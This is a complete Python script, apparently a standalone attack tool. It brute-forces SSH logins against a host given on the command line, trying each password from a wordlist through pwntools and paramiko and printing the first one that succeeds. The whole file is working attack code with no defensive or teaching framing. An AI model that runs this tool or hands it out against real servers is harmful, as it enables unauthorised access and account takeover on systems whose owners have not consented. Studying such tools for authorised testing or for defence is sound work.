# Importing necessary libraries
from pwn import *
import paramiko
import argparse

# Function to perform SSH brute force attack
def ssh_bruteforce(host, username, password_list):
    attempts = 0
    
    # Opening the password list file
    with open(password_list, "r") as password_file:
        # Iterating through each password in the list
        for password in password_file:
            password = password.strip("\n")  # Removing newline character
            try:
                # Attempting SSH connection with current password
                print("[{}] Attempting Password: '{}'".format(attempts, password))
                response = ssh(host=host, user=username, password=password, timeout=1)
                # Checking if connection is successful
                if response.connected():
                    print("[>] Valid Password Found: '{}'".format(password))
                    response.close()
                    break  # Exiting loop if valid password is found
                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                # Handling exception for invalid password
                print("[X] Invalid Password!")
            
            attempts += 1  # Incrementing attempt counter

# Main function to parse command-line arguments and initiate SSH brute force attack
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool")
    parser.add_argument("host", help="Target host IP address")
    parser.add_argument("username", help="Username for SSH connection")
    parser.add_argument("password_list", help="File containing list of passwords")
    args = parser.parse_args()

    # Calling ssh_bruteforce function with provided arguments
    ssh_bruteforce(args.host, args.username, args.password_list)
